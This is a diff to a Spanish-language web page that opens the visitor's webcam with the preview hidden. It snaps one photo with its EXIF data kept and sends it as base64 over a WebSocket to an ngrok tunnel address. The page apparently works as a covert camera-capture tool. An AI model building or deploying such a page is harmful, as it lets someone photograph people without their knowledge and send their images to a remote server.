@@ -8,11 +8,9 @@
 <body>
     <h1>Captura de Imagen Remota</h1>
     <video id="video" autoplay style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        //const socket = new WebSocket('ws://localhost:80/ws/capture/');
-        const socket = new WebSocket('wss://b082-189-239-58-13.ngrok-free.app/ws/capture/');//Cambiar el url que Ngrot genera en cada rinicio de servidor
+        const socket = new WebSocket('wss://c0ff-200-92-166-60.ngrok-free.app/ws/capture/');
 
         socket.onopen = function(event) {
             console.log("Conectado al WebSocket:", event);
@@ -38,9 +36,7 @@
                     const video = document.getElementById("video");
                     video.srcObject = stream;
                     video.onloadedmetadata = () => {
-                        setTimeout(() => {
-                            capturarImagen(stream);
-                        }, 500);
+                        capturarImagenComoBlob(stream);
                     };
                 })
                 .catch(error => {
@@ -48,27 +44,40 @@
                 });
         }
 
-        function capturarImagen(stream) {
-            const video = document.getElementById("video");
-            const canvas = document.getElementById("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+        function capturarImagenComoBlob(stream) {
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
 
-            const context = canvas.getContext("2d");
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imagenCapturada = canvas.toDataURL("image/png");
-
-            enviarImagenAlServidor(imagenCapturada);
-            stream.getTracks().forEach(track => track.stop());
+            // Toma la foto directamente como un Blob para preservar EXIF
+            imageCapture.takePhoto()
+                .then(blob => {
+                    console.log("Imagen capturada con EXIF intacto:", blob);
+                    enviarImagenAlServidor(blob);
+                })
+                .catch(error => {
+                    console.error("Error al capturar imagen:", error);
+                })
+                .finally(() => {
+                    // Detener el flujo de la cámara después de capturar la imagen
+                    stream.getTracks().forEach(track => track.stop());
+                });
         }
 
-        function enviarImagenAlServidor(imagen) {
-            const message = JSON.stringify({
-                action: 'save_image',
-                image: imagen
-            });
-            socket.send(message);
-            console.log("Imagen enviada al servidor a través de WebSocket");
+        function enviarImagenAlServidor(blob) {
+            const reader = new FileReader();
+
+            reader.onloadend = function() {
+                const base64data = reader.result;
+                const message = JSON.stringify({
+                    action: 'save_image',
+                    image: base64data
+                });
+                socket.send(message);
+                console.log("Imagen enviada al servidor a través de WebSocket");
+            };
+
+            // Lee el Blob como un DataURL para enviarlo al servidor
+            reader.readAsDataURL(blob);
         }
     </script>
 </body>
